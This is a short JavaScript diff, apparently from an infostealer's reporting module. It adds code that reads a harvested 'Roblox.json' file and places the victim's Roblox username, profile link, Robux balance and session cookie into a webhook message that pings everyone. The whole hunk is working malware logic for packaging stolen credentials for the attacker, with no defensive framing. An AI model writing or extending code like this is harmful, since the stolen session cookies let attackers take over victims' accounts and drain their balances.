@@ -114,6 +114,22 @@ const json = async (zipFile) => {
     });
   }
 
+  if (fs.existsSync(join(tempFolder, 'Roblox.json'))) {
+    const robloxInfo = JSON.parse(fs.readFileSync(join(tempFolder, 'Roblox.json')).toString());
+
+    embeds.push({
+      author: {
+        name: robloxInfo.UserName,
+        icon_url: robloxInfo.ThumbnailUrl,
+        url: `https://www.roblox.com/users/${robloxInfo.UserId}/profile`
+      },
+      description: `💎 Robux Balance: ${robloxInfo.RobuxBalance} Robux\n🍪 Cookie: ${codeBlock(robloxInfo.cookie)}`,
+      thumbnail: {
+        url: robloxInfo.ThumbnailUrl
+      }
+    });
+  }
+
   return {
     content: webhook.content, embeds, allowed_mentions: { parse: ['everyone'], },
     attachments: [{
